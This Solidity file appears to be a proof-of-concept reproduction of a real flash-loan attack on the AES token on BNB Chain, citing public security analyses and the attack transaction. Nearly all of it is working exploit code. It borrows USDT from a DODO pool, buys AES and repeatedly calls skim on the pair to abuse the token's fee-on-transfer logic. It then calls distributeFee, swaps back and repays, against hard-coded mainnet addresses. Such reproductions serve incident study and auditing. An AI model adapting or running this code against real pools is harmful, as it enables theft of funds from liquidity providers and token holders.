// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;
import '@openzeppelin/contracts/token/ERC20/IERC20.sol';
import './UniRouterV2.sol';

// @Analysis
// https://twitter.com/BlockSecTeam/status/1600442137811689473
// https://twitter.com/peckshield/status/1600418002163625984
// @TX
// https://bscscan.com/tx/0xca4d0d24aa448329b7d4eb81be653224a59e7b081fc7a1c9aad59c5a38d0ae19

interface IAES is IERC20 {
    function distributeFee() external;
}

interface Uni_Pair_V2 {
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Burn(address indexed sender, uint256 amount0, uint256 amount1, address indexed to);
    event Mint(address indexed sender, uint256 amount0, uint256 amount1);
    event Swap(
        address indexed sender,
        uint256 amount0In,
        uint256 amount1In,
        uint256 amount0Out,
        uint256 amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);
    event Transfer(address indexed from, address indexed to, uint256 value);

    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function MINIMUM_LIQUIDITY() external view returns (uint256);

    function PERMIT_TYPEHASH() external view returns (bytes32);

    function allowance(address, address) external view returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function balanceOf(address) external view returns (uint256);

    function burn(address to) external returns (uint256 amount0, uint256 amount1);

    function decimals() external view returns (uint8);

    function factory() external view returns (address);

    function getReserves() external view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast);

    function initialize(address _token0, address _token1) external;

    function kLast() external view returns (uint256);

    function mint(address to) external returns (uint256 liquidity);

    function name() external view returns (string memory);

    function nonces(address) external view returns (uint256);

    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    function price0CumulativeLast() external view returns (uint256);

    function price1CumulativeLast() external view returns (uint256);

    function skim(address to) external;

    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes memory data) external;

    function symbol() external view returns (string memory);

    function sync() external;

    function token0() external view returns (address);

    function token1() external view returns (address);

    function totalSupply() external view returns (uint256);

    function transfer(address to, uint256 value) external returns (bool);

    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

interface DVM {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;

    function init(
        address maintainer,
        address baseTokenAddress,
        address quoteTokenAddress,
        uint256 lpFeeRate,
        address mtFeeRateModel,
        uint256 i,
        uint256 k,
        bool isOpenTWAP
    ) external;

    function _BASE_TOKEN_() external returns (address);

    function _QUOTE_TOKEN_() external returns (address);
}

contract Aes {
    IAES AES = IAES(0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3);
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address dodo = 0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A;

    function testExploit() public {
        USDT.approve(address(Router), type(uint256).max);
        AES.approve(address(Router), type(uint256).max);
        DVM(dodo).flashLoan(0, 100_000 * 1e18, address(this), new bytes(1));
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        USDTToAES();
        AES.transfer(address(Pair), AES.balanceOf(address(this)) / 2);
        for (uint256 i = 0; i < 37; i++) {
            Pair.skim(address(Pair));
        }
        Pair.skim(address(this));
        AES.distributeFee();
        Pair.sync();
        AESToUSDT();
        USDT.transfer(dodo, 100_000 * 1e18);
    }

    function USDTToAES() internal {
        address[] memory path = new address[](2);
        path[0] = address(USDT);
        path[1] = address(AES);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            100_000 * 1e18,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function AESToUSDT() internal {
        address[] memory path = new address[](2);
        path[0] = address(AES);
        path[1] = address(USDT);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            AES.balanceOf(address(this)),
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}
